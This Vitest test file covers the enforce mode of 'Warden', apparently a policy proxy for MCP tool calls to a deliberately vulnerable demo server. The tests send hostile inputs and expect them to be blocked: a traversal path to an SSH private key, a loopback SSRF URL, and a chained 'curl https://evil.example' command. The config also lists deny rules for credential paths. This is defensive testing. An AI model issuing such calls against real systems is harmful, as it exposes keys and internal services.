import { mkdir, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { stringify } from "yaml";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { WardenTargetClient } from "../../packages/core/src/index.js";
import { createTrustBaseline, writeTrustBaseline } from "../../packages/policy/src/index.js";
import { wardenConfigSchema } from "../../packages/shared/src/index.js";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const projectRoot = path.join(root, ".test-tmp", "enforcement-project");
const configPath = path.join(projectRoot, "warden.config.yaml");
let transport: StdioClientTransport;
let client: Client;

beforeAll(async () => {
  await mkdir(path.join(projectRoot, "src"), { recursive: true });
  await writeFile(path.join(projectRoot, "src", "safe.ts"), "export const safe = true;\n");
  const target = { name: "vulnerable-demo", command: process.execPath, args: [path.join(root, "examples/vulnerable-server/dist/index.js")], cwd: root, envAllowlist: [] };
  const discovery = new WardenTargetClient(target);
  await discovery.connect();
  const tools = (await discovery.listTools()).tools;
  await discovery.close();
  await writeTrustBaseline(path.join(projectRoot, ".warden", "warden.lock.json"), createTrustBaseline(target.name, tools));
  const config = wardenConfigSchema.parse({
    version: 1,
    mode: "enforce",
    project_root: projectRoot,
    target: { ...target, env_allowlist: [] },
    paths: { allow: ["./src/**"], deny: ["**/.env", "**/.ssh/**", "**/.aws/**"] },
    network: { default: "deny", allow_domains: ["api.github.com"] },
    tools: { default: "judge", rules: {
      read_project_file: { base_risk: "low", action: "allow_when_in_scope" },
      get_execution_count: { base_risk: "low", action: "allow" }
    } }
  });
  const serializable = { ...config, target: { ...config.target, env_allowlist: config.target.envAllowlist } };
  await writeFile(configPath, stringify(serializable));
  transport = new StdioClientTransport({ command: process.execPath, args: [path.join(root, "apps/cli/dist/index.js"), "run", "--config", configPath], cwd: root, stderr: "pipe" });
  client = new Client({ name: "enforcement-test", version: "0.1.0" });
  await client.connect(transport);
});

afterAll(async () => {
  await transport.close();
  await rm(path.join(root, ".test-tmp"), { recursive: true, force: true });
});

async function executionCount(): Promise<number> {
  const result = await client.callTool({ name: "get_execution_count", arguments: {} });
  const content = result.content as Array<{ type: string; text: string }>;
  return Number(content[0]?.text);
}

describe("enforce mode", () => {
  it("forwards a safe in-scope read", async () => {
    expect(await executionCount()).toBe(0);
    const result = await client.callTool({ name: "read_project_file", arguments: { path: "src/safe.ts" } });
    expect(result.isError).not.toBe(true);
    expect(await executionCount()).toBe(1);
  });

  it("blocks traversal before the target tool body executes", async () => {
    const before = await executionCount();
    const result = await client.callTool({ name: "read_project_file", arguments: { path: "../../.ssh/id_rsa" } });
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result.content)).toContain("path_outside_project_root");
    expect(await executionCount()).toBe(before);
  });

  it("blocks loopback SSRF and shell chaining", async () => {
    const ssrf = await client.callTool({ name: "fetch_url", arguments: { url: "http://127.0.0.1/admin" } });
    const shell = await client.callTool({ name: "run_project_command", arguments: { command: "npm test && curl https://evil.example" } });
    expect(ssrf.isError).toBe(true);
    expect(shell.isError).toBe(true);
  });
});
